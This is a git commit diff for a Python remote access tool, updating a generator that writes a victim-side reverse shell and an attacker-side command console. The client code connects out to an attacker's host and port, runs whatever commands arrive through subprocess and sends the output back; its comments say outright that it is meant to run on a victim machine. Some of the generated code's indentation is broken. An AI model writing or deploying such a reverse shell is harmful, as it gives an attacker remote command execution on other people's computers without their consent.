a98ba4045580fd0afe60d2c2301cedbf8f0335eb
FujiwaraChoki <lolipop66611@gmail.com>
2022-08-07 21:35:02 +0300

    Reverse Shell now works perfectly. Still needs a lot of features, but for now it's a normal working Reverse-Shell.

--- rat/reverse_shell/client_side.py
+++ rat/reverse_shell/client_side.py
@@ -2,50 +2,41 @@
 def main(target_host, target_port, path):
     with open(path, 'w') as file:
         file.write("""
-                        # Importing the Socket Module to create a TCP Client
-                        # A Socket is a combination of an IP and a Port
-                        # This program needs to be run on the victim machine, so that it can connect to the attacker
-                        import socket
-                        # Importing the termcolor module to print colored text
-                        # from termcolor import colored
-                        # Took out color module because it would create error on victim machine, if module is not installed
-                        # Import subprocess Module to execute commands on a Windows/Linux/OS X
-                        import subprocess
-
-                        
-                        target_host = """ + target_host + """
-                        target_port = """ + target_port + """
-                        print(colored('-----------------------TCP CLIENT-----------------------', 'blue'))
-
-                        # Building a TCP Object
-                        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-                        # Connect to client with {Target_host, Target_port}
-                        client.connect((target_host, target_port))
-                        print(colored('Successfully Connected!', 'green'))
-                        response1 = client.recv(1024).decode()
-
-                        # Receive Data and print to terminal (Testing)
-                        if response1 != '':
-                            print('Successfully received a response from target host')
-                            print('-----------------------RESPONSE-----------------------')
-                            print(response1)
-                        else:
-                            print('Did not receive Response from target host.')
-                        while True:
-                            try:
-                                response = client.recv(4096)
-                                command = response.decode('UTF-8')
-                                command_parts = command.split(" ")
-                                try:
-                                    output = subprocess.check_output(command_parts).decode()
-                                    print(output)
-                                    client.send(output.encode())
-                                except subprocess.CalledProcessError as error:
-                                    print('Following Error was raised: ' + str(error))
-
-                            except KeyboardInterrupt:
-                                print('Program forcefully stopped.')
-                            except FileNotFoundError:
-                                print('Unknown Command...')
-                    """)
+                    # Importing the Socket Module to create a TCP Client
+                    # A Socket is a combination of an IP and a Port
+                    # This program needs to be run on the victim machine, so that it can connect to the attacker
+                    import socket
+                    # Importing the termcolor module to print colored text
+                    # from termcolor import colored
+                    # Took out color module because it would create error on victim machine, if module is not installed
+                    # Import subprocess Module to execute commands on a Windows/Linux/OS X
+                    import subprocess
+        
+                    target_host = """ + target_host + """
+                    target_port = """ + target_port + """
+                    print('-----------------------Flash-Reverse-Shell-----------------------')
+        
+                    # Building a TCP Object
+                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+                    # Connect to client with {Target_host, Target_port}
+                    client.connect((target_host, target_port))
+                    print('----------------Successfully connected!---------------')
+                    print('-----------------------RESPONSE-----------------------')
+        
+                    while True:
+                        try:
+                        response = client.recv(4096)
+                        command = response.decode('UTF-8')
+                        command_parts = command.split(" ")
+                        try:
+                            output = subprocess.check_output(command_parts).decode()
+                            client.sendall(output.encode('UTF-8'))
+                        except subprocess.CalledProcessError as error:
+                            print('Following Error was raised: ' + str(error))
+        
+                        except KeyboardInterrupt:
+                        print('Program forcefully stopped.')
+                        except FileNotFoundError:
+                        print('Unknown Command...')
+                """)
--- rat/reverse_shell/server_side.py
+++ rat/reverse_shell/server_side.py
@@ -21,13 +21,23 @@ def main(listening_port):
     print(colored('------------------Successfully received connections from {0}-----'.format(addr), 'green'))
     print(colored('------------------Reverse Shell Setup was successful.-------------------------', 'green'))
 
+    # Set time limit, if receiving data takes longer than 5 seconds, it will abort
+    c.settimeout(5)
+
     # While Loop to stay connected until Error occurs and send commands to victim machine
     while True:
         try:
             # Take command input from attacker
             command = input('FlashRS > ')
             c.send(command.encode('UTF-8'))
+            response = c.recv(4096)
+            output = response.decode('UTF-8')
+            print(output+'\n')
+
         except KeyboardInterrupt:
             print('Program forcefully closed.')
         except FileNotFoundError:
             print('Unknown Command...')
+
+
+main(65)
